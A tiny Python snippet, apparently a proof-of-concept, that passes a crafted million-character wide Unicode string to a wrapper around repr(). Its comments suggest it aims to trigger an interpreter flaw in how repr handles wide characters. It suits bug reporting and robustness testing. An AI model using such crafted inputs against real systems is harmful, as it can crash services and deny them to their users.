def vulnerable_function(s):
    return repr(s)

# Create a crafted wide character UTF-32/UCS-4 string
crafted_string = '\U00011111' * 1000000

# Call the vulnerable function with the crafted string
vulnerable_function(crafted_string)